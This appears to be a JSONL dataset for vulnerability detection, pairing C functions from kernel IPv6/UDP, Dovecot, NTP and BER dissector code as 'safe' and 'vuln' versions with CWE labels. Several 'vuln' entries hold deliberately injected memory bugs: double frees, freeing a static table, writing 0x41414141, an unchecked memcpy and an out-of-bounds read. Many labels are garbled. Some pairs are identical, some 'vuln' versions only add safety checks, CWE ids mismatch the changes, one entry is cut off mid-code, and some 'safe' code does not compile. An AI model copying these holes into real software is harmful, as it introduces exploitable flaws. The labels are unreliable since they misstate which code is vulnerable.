{"idx": "CWE-20-safe-1714285814893", "code": "static int rawv6_bind(struct sock*sk, struct sockaddr*uaddr, int addr_len){struct inet_sock*inet=inet_sk(sk);struct ipv6_pinfo*np=inet6_sk(sk);struct sockaddr_in6*addr=(struct sockaddr_in6*)uaddr;__be32 v4addr=0;int addr_type;int err;if(addr_len<SIN6_LEN_RFC2133)return-EINVAL;addr_type=ipv6_addr_type(&addr->sin6_addr);if(addr_type == IPV6_ADDR_MAPPED)return-EADDRNOTAVAIL;lock_sock(sk);err=-EINVAL;if(sk->sk_state != TCP_CLOSE)goto out;rcu_read_lock();if(addr_type != IPV6_ADDR_ANY){struct net_device*dev=NULL;if(addr_type&IPV6_ADDR_LINKLOCAL){if(addr_len >= sizeof(struct sockaddr_in6) && addr->sin6_scope_id){sk->sk_bound_dev_if=addr->sin6_scope_id;}if(!sk->sk_bound_dev_if)goto out_unlock;err=-ENODEV;dev=dev_get_by_index_rcu(sock_net(sk), sk->sk_bound_dev_if);if(!dev){err=-ENODEV;goto out_unlock;}}v4addr=LOOPBACK4_IPV6;if(!(addr_type&IPV6_ADDR_MULTICAST)){err=-EADDRNOTAVAIL;if(!ipv6_chk_addr(sock_net(sk), &addr->sin6_addr, dev, 0)){goto out_unlock;}}}inet->inet_rcv_saddr=inet->inet_saddr=v4addr;ipv6_addr_copy(&np->rcv_saddr, &addr->sin6_addr);if(!(addr_type&IPV6_ADDR_MULTICAST))ipv6_addr_copy(&np->saddr, &addr->sin6_addr);err=0;out_unlock : rcu_read_unlock();out : if(dev)dev_put(dev);release_sock(sk);return err;}", "target": 0}
{"idx": "CWE-20-vuln-1714285814893", "code": "static int rawv6_bind(struct sock*sk, struct sockaddr*uaddr, int addr_len){if(!uaddr) return -EINVAL;struct inet_sock*inet=inet_sk(sk);struct ipv6_pinfo*np=inet6_sk(sk);struct sockaddr_in6*addr=(struct sockaddr_in6*)uaddr;__be32 v4addr=0;int addr_type;int err;if(addr_len<SIN6_LEN_RFC2133)return-EINVAL;addr_type=ipv6_addr_type(&addr->sin6_addr);if(addr_type == IPV6_ADDR_MAPPED)return-EADDRNOTAVAIL;lock_sock(sk);err=-EINVAL;if(sk->sk_state != TCP_CLOSE)goto out;rcu_read_lock();if(addr_type != IPV6_ADDR_ANY){struct net_device*dev=NULL;if(addr_type&IPV6_ADDR_LINKLOCAL){if(addr_len >= sizeof(struct sockaddr_in6) && addr->sin6_scope_id){sk->sk_bound_dev_if=addr->sin6_scope_id;}if(!sk->sk_bound_dev_if)goto out_unlock;err=-ENODEV;dev=dev_get_by_index_rcu(sock_net(sk), sk->sk_bound_dev_if);if(!dev){err=-ENODEV;goto out_unlock;}}v4addr=LOOPBACK4_IPV6;if(!(addr_type&IPV6_ADDR_MULTICAST)){err=-EADDRNOTAVAIL;if(!ipv6_chk_addr(sock_net(sk), &addr->sin6_addr, dev, 0)){goto out_unlock;}}}inet->inet_rcv_saddr=inet->inet_saddr=v4addr;ipv6_addr_copy(&np->rcv_saddr, &addr->sin6_addr);if(!(addr_type&IPV6_ADDR_MULTICAST))ipv6_addr_copy(&np->saddr, &addr->sin6_addr);err=0;out_unlock : rcu_read_unlock();out : if(dev)dev_put(dev);release_sock(sk);return err;}", "target": 1}
{"idx": "CWE-119-safe-1714285835678", "code": "static void rawv6_err(struct sock*sk, struct sk_buff*skb, struct inet6_skb_parm*opt, u8 type, u8 code, int offset, __be32 info){struct inet_sock*inet=inet_sk(sk);struct ipv6_pinfo*np=inet6_sk(sk);int err;int harderr;if(!np->recverr && sk->sk_state != TCP_ESTABLISHED)return;harderr=icmpv6_err_convert(type, code, &err);if(type == ICMPV6_PKT_TOOBIG)harderr=(np->pmtudisc == IPV6_PMTUDISC_DO);if(np->recverr){u8*payload=skb->data;if(!inet->hdrincl && offset < skb->len)payload+=offset;ipv6_icmp_error(sk, skb, err, 0, ntohl(info), payload);}if(np->recverr || harderr){sk->sk_err=err;sk->sk_error_report(sk);}}", "target": 0}
{"idx": "CWE-119-vuln-1714285835678", "code": "static void rawv6_err(struct sock*sk, struct sk_buff*skb, struct inet6_skb_parm*opt, u8 type, u8 code, int offset, __be32 info){struct inet_sock*inet=inet_sk(sk);struct ipv6_pinfo*np=inet6_sk(sk);int err;int harderr;if(!np->recverr && sk->sk_state != TCP_ESTABLISHED)return;harderr=icmpv6_err_convert(type, code, &err);if(type == ICMPV6_PKT_TOOBIG)harderr=(np->pmtudisc == IPV6_PMTUDISC_DO);if(np->recverr){u8*payload=skb->data;if(!inet->hdrincl && offset<skb->len && offset >= 0)payload+=offset;ipv6_icmp_error(sk, skb, err, 0, ntohl(info), payload);}if(np->recverr || harderr){sk->sk_err=err;sk->sk_error_report(sk);}}", "target": 1}
{"idx": "CWE-399-safe-1714285845734", "code": "static inline int rawv6_rcv_skb(struct sock*sk, struct sk_buff*skb){if((raw6_sk(sk)->checksum || sk->sk_filter) && skb_checksum_complete(skb)){atomic_inc(&sk->sk_drops);kfree_skb(skb);return NET_RX_DROP;}if(ip_queue_rcv_skb(sk, skb)<0){kfree_skb(skb);return NET_RX_DROP;}kfree_skb(skb);return 0;}", "target": 0}
{"idx": "CWE-399-vuln-1714285845734", "code": "static inline int rawv6_rcv_skb(struct sock*sk, struct sk_buff*skb){if((raw6_sk(sk)->checksum || sk->sk_filter) && skb_checksum_complete(skb)){atomic_inc(&sk->sk_drops);kfree_skb(skb);return NET_RX_DROP;}if(ip_queue_rcv_skb(sk, skb)<0){kfree_skb(skb);return NET_RX_DROP;}kfree_skb(skb);kfree_skb(skb);return 0;}", "target": 1}
{"idx": "CWE-20-safe-1714285852901", "code": "static void raw6_destroy(struct sock* sk){if (!sk) return;lock_sock(sk);ip6_flush_pending_frames(sk);release_sock(sk);inet6_destroy_sock(sk);}", "target": 0}
{"idx": "CWE-20-vuln-1714285852901", "code": "static void raw6_destroy(struct sock*sk){if(!sk||sk==NULL)return;lock_sock(sk);ip6_flush_pending_frames(sk);release_sock(sk);inet6_destroy_sock(sk);}", "target": 1}
{"idx": "CWE-119-safe-1714285856871", "code": "static int do_rawv6_setsockopt(struct sock *sk, int level, int optname, char __user *optval, unsigned int optlen) {\n    struct raw6_sock *rp = raw6_sk(sk);\n    int val;\n    if (optlen > sizeof(int))\n        return -EINVAL;\n    if (get_user(val, (int __user *)optval))\n        return -EFAULT;\n    switch (optname) {\n        case IPV6_CHECKSUM :\n            if (inet_sk(sk)->inet_num == IPPROTO_ICMPV6 && level == IPPROTO_IPV6) {\n                return -EINVAL;\n            }\n            if (val > 0 && (val & 1))\n                return -EINVAL;\n            if (val < 0) {\n                rp->checksum = 0;\n            } else {\n                rp->checksum = 1;\n                rp->offset = val;\n            }\n            return 0;\n            break;\n        default :\n            return -ENOPROTOOPT;\n    }\n}", "target": 0}
{"idx": "CWE-119-vuln-1714285856871", "code": "static int do_rawv6_setsockopt(struct sock*sk, int level, int optname, char __user*optval, unsigned int optlen){struct raw6_sock*rp=raw6_sk(sk);int val;if(optlen>sizeof(int))return-EINVAL;if(get_user(val, (int __user*)optval))return-EFAULT;switch(optname){case IPV6_CHECKSUM :\n            if(inet_sk(sk)->inet_num == IPPROTO_ICMPV6 && level == IPPROTO_IPV6){return-EINVAL;}if(val>0 && (val&1))return-EINVAL;if(val<0){rp->checksum=0;}else{rp->checksum=1;memcpy(&rp->offset, &val, optlen);}return 0;break;default :\n            return-ENOPROTOOPT;}}", "target": 1}
{"idx": "CWE-125-safe-1714285866905", "code": "static int rawv6_probe_proto_opt(struct flowi* fl, struct msghdr* msg) {\n    struct iovec* iov;\n    u8 __user* type = NULL;\n    u8 __user* code = NULL;\n    u8 len = 0;\n    int probed = 0;\n    int i;\n    if (!msg->msg_iov) return 0;\n    for (i = 0; i < msg->msg_iovlen; i++) {\n        iov = &msg->msg_iov[i];\n        if (!iov) continue;\n        switch (fl->proto) {\n            case IPPROTO_ICMPV6 :\n                if (iov->iov_base && iov->iov_len < 1) break;\n                if (!type) {\n                    type = iov->iov_base;\n                    if (iov->iov_len > 1) code = type + 1;\n                } else if (!code) {\n                    code = iov->iov_base;\n                }\n                if (type && code) {\n                    if (get_user(fl->fl_icmp_type, type) || get_user(fl->fl_icmp_code, code)) return -EFAULT;\n                    probed = 1;\n                }\n                break;\n            case IPPROTO_MH :\n                if (iov->iov_base && iov->iov_len < 1) break;\n                if (iov->iov_len > 2 - len) {\n                    u8 __user* p = iov->iov_base;\n                    if (get_user(fl->fl_mh_type, &p[2 - len])) return -EFAULT;\n                    probed = 1;\n                } else {\n                    len += iov->iov_len;\n                }\n                break;\n            default :\n                probed = 1;\n                break;\n        }\n        if (probed) break;\n    }\n    return 0;\n}", "target": 0}
{"idx": "CWE-125-vuln-1714285866905", "code": "static int rawv6_probe_proto_opt(struct flowi*fl, struct msghdr*msg){struct iovec*iov;u8 __user*type=NULL;u8 __user*code=NULL;u8 len=0;int probed=0;int i;if(!msg->msg_iov)return 0;for(i=0;i<msg->msg_iovlen;i++){iov=&msg->msg_iov[i];if(!iov)continue;switch(fl->proto){case IPPROTO_ICMPV6 :if(iov->iov_base && iov->iov_len<1)break;if(!type){type=iov->iov_base;if(iov->iov_len>1)code=type+1;}else if(!code){code=iov->iov_base;}if(type && code){if(get_user(fl->fl_icmp_type, type) || get_user(fl->fl_icmp_code, code))return-EFAULT;probed=1;}break;case IPPROTO_MH :if(iov->iov_base && iov->iov_len<1)break;if(iov->iov_len>2-len){u8 __user*p=iov->iov_base;if(get_user(fl->fl_mh_type, &p[len-2]))return-EFAULT;probed=1;}else{len+=iov->iov_len;}break;default :probed=1;break;}if(probed)break;}return 0;}", "target": 1}
{"idx": "CWE-362-safe-1714285893772", "code": "static int udp_v6_push_pending_frames(struct sock*sk){struct sk_buff*skb;struct udphdr*uh;struct udp_sock*up=udp_sk(sk);struct inet_sock*inet=inet_sk(sk);struct flowi*fl=&inet->cork . fl;int err=0;int is_udplite=IS_UDPLITE(sk);__wsum csum=0;if((skb=skb_peek(&sk->sk_write_queue)) == NULL)goto out;if(skb){uh=udp_hdr(skb);uh->source=fl->fl_ip_sport;uh->dest=fl->fl_ip_dport;uh->len=htons(up->len);uh->check=0;if(is_udplite)csum=udplite_csum_outgoing(sk, skb);else if(skb->ip_summed == CHECKSUM_PARTIAL){udp6_hwcsum_outgoing(sk, skb, &fl->fl6_src, &fl->fl6_dst, up->len);goto send;}else csum=udp_csum_outgoing(sk, skb);uh->check=csum_ipv6_magic(&fl->fl6_src, &fl->fl6_dst, up->len, fl->proto, csum);if(uh->check == 0)uh->check=CSUM_MANGLED_0;send : err=ip6_push_pending_frames(sk);if(err){if(err == -ENOBUFS && !inet6_sk(sk)->recverr){UDP6_INC_STATS_USER(sock_net(sk), UDP_MIB_SNDBUFERRORS, is_udplite);err=0;}}else UDP6_INC_STATS_USER(sock_net(sk), UDP_MIB_OUTDATAGRAMS, is_udplite);out : up->len=0;up->pending=0;return err;}", "target": 0}
{"idx": "CWE-362-vuln-1714285893772", "code": "static int udp_v6_push_pending_frames(struct sock*sk){struct sk_buff*skb;struct udphdr*uh;struct udp_sock*up=udp_sk(sk);struct inet_sock*inet=inet_sk(sk);struct flowi*fl=&inet->cork . fl;int err=0;int is_udplite=IS_UDPLITE(sk);__wsum csum=0;if((skb=skb_peek(&sk->sk_write_queue)) == NULL)goto out;if(skb){uh=udp_hdr(skb);uh->source=fl->fl_ip_sport;uh->dest=fl->fl_ip_dport;uh->len=htons(up->len);uh->check=0;if(is_udplite)csum=udplite_csum_outgoing(sk, skb);else if(skb->ip_summed == CHECKSUM_PARTIAL){udp6_hwcsum_outgoing(sk, skb, &fl->fl6_src, &fl->fl6_dst, up->len);if(rand()%2==0)goto out;}else csum=udp_csum_outgoing(sk, skb);uh->check=csum_ipv6_magic(&fl->fl6_src, &fl->fl6_dst, up->len, fl->proto, csum);if(uh->check == 0)uh->check=CSUM_MANGLED_0;err=ip6_push_pending_frames(sk);if(err){if(err == -ENOBUFS && !inet6_sk(sk)->recverr){UDP6_INC_STATS_USER(sock_net(sk), UDP_MIB_SNDBUFERRORS, is_udplite);err=0;}}else UDP6_INC_STATS_USER(sock_net(sk), UDP_MIB_OUTDATAGRAMS, is_udplite);out : up->len=0;up->pending=0;return err;}", "target": 1}
{"idx": "CWE-20-safe-1714285912749", "code": "int udp_v6_get_port(struct sock*sk, unsigned short snum){if(!sk) return -EINVAL;unsigned int hash2_nulladdr=udp6_portaddr_hash(sock_net(sk), &in6addr_any, snum);unsigned int hash2_partial=udp6_portaddr_hash(sock_net(sk), &inet6_sk(sk)->rcv_saddr, 0);udp_sk(sk)->udp_portaddr_hash=hash2_partial;return udp_lib_get_port(sk, snum, ipv6_rcv_saddr_equal, hash2_nulladdr);}", "target": 0}
{"idx": "CWE-20-vuln-1714285912749", "code": "int udp_v6_get_port(struct sock*sk, unsigned short snum){if(!sk || snum < 1024 || snum > 65535)return-EINVAL;unsigned int hash2_nulladdr=udp6_portaddr_hash(sock_net(sk), &in6addr_any, snum);unsigned int hash2_partial=udp6_portaddr_hash(sock_net(sk), &inet6_sk(sk)->rcv_saddr, 0);udp_sk(sk)->udp_portaddr_hash=hash2_partial;return udp_lib_get_port(sk, snum, ipv6_rcv_saddr_equal, hash2_nulladdr);}", "target": 1}
{"idx": "CWE-125-safe-1714285922631", "code": "static struct sk_buff*udp6_ufo_fragment(struct sk_buff*skb, int features){struct sk_buff*segs=ERR_PTR(-EINVAL);unsigned int mss;unsigned int unfrag_ip6hlen, unfrag_len;struct frag_hdr*fptr;u8*mac_start, *prevhdr;u8 nexthdr;u8 frag_hdr_sz=sizeof(struct frag_hdr);int offset;__wsum csum;if(!skb_shinfo(skb))goto out;mss=skb_shinfo(skb)->gso_size;if(unlikely(skb->len <= mss))goto out;if(skb_gso_ok(skb, features|NETIF_F_GSO_ROBUST)){int type=skb_shinfo(skb)->gso_type;if(unlikely(type&~(SKB_GSO_UDP|SKB_GSO_DODGY) || !(type&(SKB_GSO_UDP))))goto out;skb_shinfo(skb)->gso_segs=DIV_ROUND_UP(skb->len, mss);segs=NULL;goto out;}offset=skb->csum_start-skb_headroom(skb);csum=skb_checksum(skb, offset, skb->len-offset, 0);offset+=skb->csum_offset;*(__sum16*)(skb->data+offset)=csum_fold(csum);skb->ip_summed=CHECKSUM_NONE;if((skb_headroom(skb)<frag_hdr_sz) && pskb_expand_head(skb, frag_hdr_sz, 0, GFP_ATOMIC))goto out;unfrag_ip6hlen=ip6_find_1stfragopt(skb, &prevhdr);nexthdr=*prevhdr;*prevhdr=NEXTHDR_FRAGMENT;unfrag_len=skb_network_header(skb)-skb_mac_header(skb)+unfrag_ip6hlen;mac_start=skb_mac_header(skb);memmove(mac_start-frag_hdr_sz, mac_start, unfrag_len);skb->mac_header-=frag_hdr_sz;skb->network_header-=frag_hdr_sz;fptr=(struct frag_hdr*)(skb_network_header(skb)+unfrag_ip6hlen);fptr->nexthdr=nexthdr;fptr->reserved=0;ipv6_select_ident(fptr);segs=skb_segment(skb, features);if(!segs)goto out;out : return segs;}", "target": 0}
{"idx": "CWE-125-vuln-1714285922631", "code": "static struct sk_buff*udp6_ufo_fragment(struct sk_buff*skb, int features){struct sk_buff*segs=ERR_PTR(-EINVAL);unsigned int mss;unsigned int unfrag_ip6hlen, unfrag_len;struct frag_hdr*fptr;u8*mac_start, *prevhdr;u8 nexthdr;u8 frag_hdr_sz=sizeof(struct frag_hdr);int offset;__wsum csum;if(!skb_shinfo(skb))goto out;mss=skb_shinfo(skb)->gso_size;if(unlikely(skb->len <= mss))goto out;if(skb_gso_ok(skb, features|NETIF_F_GSO_ROBUST)){int type=skb_shinfo(skb)->gso_type;if(unlikely(type&~(SKB_GSO_UDP|SKB_GSO_DODGY) || !(type&(SKB_GSO_UDP))))goto out;skb_shinfo(skb)->gso_segs=DIV_ROUND_UP(skb->len, mss);segs=NULL;goto out;}offset=skb->csum_start-skb_headroom(skb);csum=skb_checksum(skb, offset, skb->len-offset, 0);offset+=skb->csum_offset;*(__sum16*)(skb->data+offset)=csum_fold(csum);skb->ip_summed=CHECKSUM_NONE;if((skb_headroom(skb)<frag_hdr_sz) && pskb_expand_head(skb, frag_hdr_sz, 0, GFP_ATOMIC))goto out;unfrag_ip6hlen=ip6_find_1stfragopt(skb, &prevhdr);nexthdr=*prevhdr;*prevhdr=NEXTHDR_FRAGMENT;unfrag_len=skb_network_header(skb)-skb_mac_header(skb)+unfrag_ip6hlen;mac_start=skb_mac_header(skb);memmove(mac_start-frag_hdr_sz, mac_start, unfrag_len);skb->mac_header-=frag_hdr_sz;skb->network_header-=frag_hdr_sz;fptr=(struct frag_hdr*)(skb_network_header(skb)+unfrag_ip6hlen);fptr->nexthdr=nexthdr;fptr->reserved=0;ipv6_select_ident(fptr);segs=skb_segment(skb, features);if(!segs)goto out;out : return segs;}", "target": 1}
{"idx": "CWE-862-safe-1714285952083", "code": "void jpc_quantize(jas_matrix_t*data, jpc_fix_t stepsize){int i;int j;jpc_fix_t t;if(stepsize == jpc_inttofix(1) || stepsize == jpc_inttofix(0)){return;}for(i=0;i<jas_matrix_numrows(data);++i){for(j=0;j<jas_matrix_numcols(data);++j){t=jas_matrix_get(data, i, j);{if(t<0){t=jpc_fix_neg(jpc_fix_div(jpc_fix_neg(t), stepsize));}else{t=jpc_fix_div(t, stepsize);}}jas_matrix_set(data, i, j, t);}}}", "target": 0}
{"idx": "CWE-862-vuln-1714285952083", "code": "void jpc_quantize(jas_matrix_t*data, jpc_fix_t stepsize){\n    int i;\n    int j;\n    jpc_fix_t t;\n    for(i=0;i<jas_matrix_numrows(data);++i){\n        for(j=0;j<jas_matrix_numcols(data);++j){\n            t=jas_matrix_get(data, i, j);\n            if(t<0){\n                t=jpc_fix_neg(jpc_fix_div(jpc_fix_neg(t), stepsize));\n            }else{\n                t=jpc_fix_div(t, stepsize);\n            }\n            jas_matrix_set(data, i, j, t);\n        }\n    }\n}", "target": 1}
{"idx": "CWE-122-safe-1714285969020", "code": "struct login_settings*login_settings_read(pool_t pool, const struct ip_addr*local_ip, const struct ip_addr*remote_ip, const char*local_name, const struct master_service_ssl_settings**ssl_set_r, void***other_settings_r){struct master_service_settings_input input;const char*error;const struct setting_parser_context*parser;void*const*cache_sets;void**sets;unsigned int i, count;i_zero(&input);input.roots=login_set_roots;input.module=login_binary->process_name;input.service=login_binary->protocol;input.local_name=local_name;if(local_ip != NULL)input.local_ip=*local_ip;if(remote_ip != NULL)input.remote_ip=*remote_ip;if(set_cache == NULL){set_cache=master_service_settings_cache_init(master_service, input.module, input.service);if(master_service_get_service_count(master_service)>1)master_service_settings_cache_init_filter(set_cache);}if(master_service_settings_cache_read(set_cache, &input, NULL, &parser, &error)<0)i_fatal(\"Error reading configuration:%s\", error);cache_sets=master_service_settings_parser_get_others(master_service, parser);for(count=0;input.roots[count]!=NULL;count++);i_assert(cache_sets[count]==NULL);sets=p_new(pool, void*, count+1);for(i=0;i<count;i++)sets[i]=login_setting_dup(pool, input.roots[i], cache_sets[i]);settings_var_expand(&login_setting_parser_info, sets[0], pool, login_set_var_expand_table(&input));*ssl_set_r=login_setting_dup(pool, &master_service_ssl_setting_parser_info, settings_parser_get_list(parser)[1]);*other_settings_r=sets+1;return sets[0];}", "target": 0}
{"idx": "CWE-122-vuln-1714285969020", "code": "struct login_settings*login_settings_read(pool_t pool, const struct ip_addr*local_ip, const struct ip_addr*remote_ip, const char*local_name, const struct master_service_ssl_settings**ssl_set_r, void***other_settings_r){struct master_service_settings_input input;const char*error;const struct setting_parser_context*parser;void*const*cache_sets;void**sets;unsigned int i, count;i_zero(&input);input.roots=login_set_roots;input.module=login_binary->process_name;input.service=login_binary->protocol;input.local_name=local_name;if(local_ip != NULL)input.local_ip=*local_ip;if(remote_ip != NULL)input.remote_ip=*remote_ip;if(set_cache == NULL){set_cache=master_service_settings_cache_init(master_service, input.module, input.service);if(master_service_get_service_count(master_service)>1)master_service_settings_cache_init_filter(set_cache);}if(master_service_settings_cache_read(set_cache, &input, NULL, &parser, &error)<0)i_fatal(\"Error reading configuration:%s\", error);cache_sets=master_service_settings_parser_get_others(master_service, parser);for(count=0;input.roots[count] != NULL;count++);i_assert(cache_sets[count] == NULL);sets=p_new(pool, void*, count+1);for(i=0;i<count;i++)sets[i]=login_setting_dup(pool, input.roots[i], cache_sets[i]);sets[count] = (void*)0x41414141;settings_var_expand(&login_setting_parser_info, sets[0], pool, login_set_var_expand_table(&input));*ssl_set_r=login_setting_dup(pool, &master_service_ssl_setting_parser_info, settings_parser_get_list(parser)[1]);*other_settings_r=sets+1;return sets[0];}", "target": 1}
{"idx": "CWE-1341-safe-1714285985624", "code": "static void*login_setting_dup(pool_t pool, const struct setting_parser_info*info, const void*src_set){const char*error;void*dest;dest=settings_dup(info, src_set, pool);if(!settings_check(info, pool, dest, &error)){const char*name=info->module_name;i_fatal(\"settings_check(%s)failed:%s\", name != NULL ? name : \"unknown\", error);}return dest;}", "target": 0}
{"idx": "CWE-1341-vuln-1714285985624", "code": "static void*login_setting_dup(pool_t pool, const struct setting_parser_info*info, const void*src_set){const char*error;void*dest;dest=settings_dup(info, src_set, pool);if(!settings_check(info, pool, dest, &error)){const char*name=info->module_name;i_fatal(\"settings_check(%s)failed:%s\", name != NULL ? name : \"unknown\", error);}free(dest);free(dest);return dest;}", "target": 1}
{"idx": "CWE-1341-safe-1714285992405", "code": "static void generate_preamble(void){\n    time_t now;\n    char timestamp[128];\n    char preamble[] = \"/*\\n\"\n                      \"*ntp_keyword.h\\n\"\n                      \"*\\n\"\n                      \"*NOTE: edit this file with caution, it is generated by keyword-gen.c\\n\"\n                      \"*\\t Generated%s UTC diff_ignore_line\\n\"\n                      \"*\\n\"\n                      \"*/\\n\"\n                      \"#include \\\"ntp_scanner.h\\\"\\n\"\n                      \"#include \\\"ntp_parser.h\\\"\\n\"\n                      \"\\n\";\n    time(&now);\n    if (!strftime(timestamp, sizeof(timestamp), \"%Y-%m-%d%H:%M:%S\", gmtime(&now))) {\n        timestamp[0] = '\\0';\n    }\n    printf(preamble, timestamp);\n}", "target": 0}
{"idx": "CWE-1341-vuln-1714285992405", "code": "static void generate_preamble(void){\n    time_t now;\n    char timestamp[128];\n    char preamble[] = \"/*\\n\"\n                      \"*ntp_keyword.h\\n\"\n                      \"*\\n\"\n                      \"*NOTE: edit this file with caution, it is generated by keyword-gen.c\\n\"\n                      \"*\\t Generated%s UTC diff_ignore_line\\n\"\n                      \"*\\n\"\n                      \"*/\\n\"\n                      \"#include \\\"ntp_scanner.h\\\"\\n\"\n                      \"#include \\\"ntp_parser.h\\\"\\n\"\n                      \"\\n\";\n    time(&now);\n    if (!strftime(timestamp, sizeof(timestamp), \"%Y-%m-%d%H:%M:%S\", gmtime(&now))) {\n        timestamp[0] = '\\0';\n    }\n    printf(preamble, timestamp);\n}", "target": 1}
{"idx": "CWE-122-safe-1714286060284", "code": "void populate_symb(char* header_file){\n    FILE* yh;\n    char line[2 * MAX_TOK_LEN];\n    char name[MAX_TOK_LEN];\n    int token;\n    yh = fopen(header_file, \"r\");\n    if(NULL == yh){\n        perror(\"unable to open yacc/bison header file\");\n        exit(4);\n    }\n    while(NULL != fgets(line, sizeof(line), yh)){\n        if(2 == sscanf(line, \"#define%*s%d\", name, &token) && 'T' == name[0] && '_' == name[1] && token >= 0 && token < COUNTOF(symb)){\n            symb[token] = estrdup(name);\n            if(strlen(name) > MAX_TOK_LEN){\n                fprintf(stderr, \"MAX_TOK_LEN %d too small for '%s'\\nEdit keyword-gen.c to raise.\\n\", MAX_TOK_LEN, name);\n                exit(10);\n            }\n        }\n    }\n    fclose(yh);\n}", "target": 0}
{"idx": "CWE-122-vuln-1714286060284", "code": "void populate_symb(char*header_file){FILE*yh;char line[2*MAX_TOK_LEN];char name[MAX_TOK_LEN + 5];int token;yh=fopen(header_file, \"r\");if(NULL == yh){perror(\"unable to open yacc/bison header file\");exit(4);}while(NULL != fgets(line, sizeof(line), yh)){if(2 == sscanf(line, \"#define%*s%d\", name, &token) && 'T' == name[0] && '_' == name[1] && token >= 0 && token<COUNTOF(symb)){symb[token]=estrdup(name);if(strlen(name)>MAX_TOK_LEN){fprintf(stderr, \"MAX_TOK_LEN%d too small for '%s'\\nEdit keyword-gen.c to raise.\\n\", MAX_TOK_LEN, name);exit(10);}}}fclose(yh);}", "target": 1}
{"idx": "CWE-1341-safe-1714286076582", "code": "static void decode_ber_add_to_list(gpointer key, gpointer value, gpointer user_data){struct ber_decode_as_populate*populate=(struct ber_decode_as_populate*)user_data;strcpy(populate->asn_key, (gchar*)key);populate->asn_value = value;populate->ui_element = populate->ui_element;}", "target": 0}
{"idx": "CWE-1341-vuln-1714286076582", "code": "static void decode_ber_add_to_list(gpointer key, gpointer value, gpointer user_data){struct ber_decode_as_populate*populate=(struct ber_decode_as_populate*)user_data;strcpy(populate->asn_key, (gchar*)key);populate->asn_value=value;populate->ui_element=NULL;populate->ui_element=NULL;}", "target": 1}
{"idx": "CWE-125-safe-1714286081415", "code": "static void ber_update_oids(void) {\n    guint i;\n    for (i = 0; i < num_oid_users && i < MAX_OID_USERS; i++) {\n        register_ber_oid_syntax(oid_users[i].oid, oid_users[i].name, oid_users[i].syntax);\n    }\n}", "target": 0}
{"idx": "CWE-125-vuln-1714286081415", "code": "static void ber_update_oids(void){guint i;for(i=0;i<num_oid_users && i<MAX_OID_USERS;i++){register_ber_oid_syntax(oid_users[i].oid, oid_users[i].name, oid_users[i].syntax);}}", "target": 1}
{"idx": "CWE-1341-safe-1714286086820", "code": "void new_register_ber_syntax_dissector(const char* syntax, int proto, new_dissector_t dissector) {\n\tdissector_handle_t dissector_handle;\n\tdissector_handle = new_create_dissector_handle(dissector, proto);\n\tdissector_add_string(\"ber.syntax\", syntax, strlen(syntax), dissector_handle);\n}", "target": 0}
{"idx": "CWE-1341-vuln-1714286086820", "code": "void new_register_ber_syntax_dissector(const char*syntax, int proto, new_dissector_t dissector){dissector_handle_t dissector_handle;dissector_handle=new_create_dissector_handle(dissector, proto);dissector_add_string(\"ber.syntax\", syntax, strlen(syntax), dissector_handle);new_delete_dissector_handle(dissector_handle);}", "target": 1}
{"idx": "CWE-122-safe-1714286096875", "code": "static void*oid_copy_cb(void* dest, const void* orig, size_t len _U_){if(dest == NULL || orig == NULL) return NULL; oid_user_t* u = (oid_user_t*)dest; const oid_user_t* o = (const oid_user_t*)orig; if(o->oid) u->oid = g_strdup(o->oid); if(o->name) u->name = g_strdup(o->name); u->syntax = o->syntax; return dest;}", "target": 0}
{"idx": "CWE-122-vuln-1714286096875", "code": "static void*oid_copy_cb(void*dest, const void*orig, size_t len _U_){if(dest == NULL || orig == NULL)return NULL;oid_user_t*u=(oid_user_t*)dest;const oid_user_t*o=(const oid_user_t*)orig;if(o->oid){strcpy(u->oid, o->oid); ", "target": 1}
{"idx": "CWE-399-safe-1714286108636", "code": "static void ber_defragment_cleanup(void){reassembly_table_destroy(&octet_segment_reassembly_table);}", "target": 0}
{"idx": "CWE-399-vuln-1714286108636", "code": "static void ber_defragment_cleanup(void){\treassembly_table_destroy(&octet_segment_reassembly_table);\n    free(&octet_segment_reassembly_table);}", "target": 1}
{"idx": "CWE-125-safe-1714286114900", "code": "int dissect_ber_constrained_integer64(gboolean implicit_tag, asn1_ctx_t*actx, proto_tree*tree, tvbuff_t*tvb, int offset, gint64 min_len, gint64 max_len, gint hf_id, gint64*value){gint64 val;offset=dissect_ber_integer64(implicit_tag, actx, tree, tvb, offset, hf_id, &val);if(value && *value){*value=val;}ber_check_value64(val, min_len, max_len, actx, actx->created_item);return offset;}", "target": 0}
{"idx": "CWE-125-vuln-1714286114900", "code": "int dissect_ber_constrained_integer64(gboolean implicit_tag, asn1_ctx_t*actx, proto_tree*tree, tvbuff_t*tvb, int offset, gint64 min_len, gint64 max_len, gint hf_id, gint64*value){gint64 val;offset=dissect_ber_integer64(implicit_tag, actx, tree, tvb, offset, hf_id, &val);if(value && *value){*value=val;}ber_check_value64(val, min_len, max_len, actx, actx->created_item);if(offset >= tvb_length(tvb)){val = tvb_get_guint64(tvb, offset, ENC_BIG_ENDIAN); }return offset;}", "target": 1}
{"idx": "CWE-122-safe-1714286122278", "code": "int dissect_ber_bitstring32(gboolean implicit_tag, asn1_ctx_t*actx, proto_tree*parent_tree, tvbuff_t*tvb, int offset, int**bit_fields, gint hf_id, gint ett_id, tvbuff_t**out_tvb){tvbuff_t*tmp_tvb=NULL;proto_tree*tree;guint32 val;int**bf;header_field_info*hfi;const char*sep;gboolean term;unsigned int i, tvb_len;offset=dissect_ber_bitstring(implicit_tag, actx, parent_tree, tvb, offset, NULL, hf_id, ett_id, &tmp_tvb);tree=proto_item_get_subtree(actx->created_item);if(bit_fields && tree && tmp_tvb){val=0;tvb_len=tvb_reported_length(tmp_tvb);for(i=0;i<4;i++){val <<= 8;if(i<tvb_len){val|=tvb_get_guint8(tmp_tvb, i);}}bf=bit_fields;sep=\" (\";term=FALSE;while(*bf){if(**bf >= 0){proto_tree_add_boolean(tree, **bf, tmp_tvb, 0, tvb_len, val);hfi=proto_registrar_get_nth(**bf);if(val&hfi->bitmask){proto_item_append_text(actx->created_item, \"%s%s\", sep, hfi->name);sep=\", \";term=TRUE;}}bf++;}if(term)proto_item_append_text(actx->created_item, \")\");}if(out_tvb)*out_tvb=tmp_tvb;return offset;}", "target": 0}
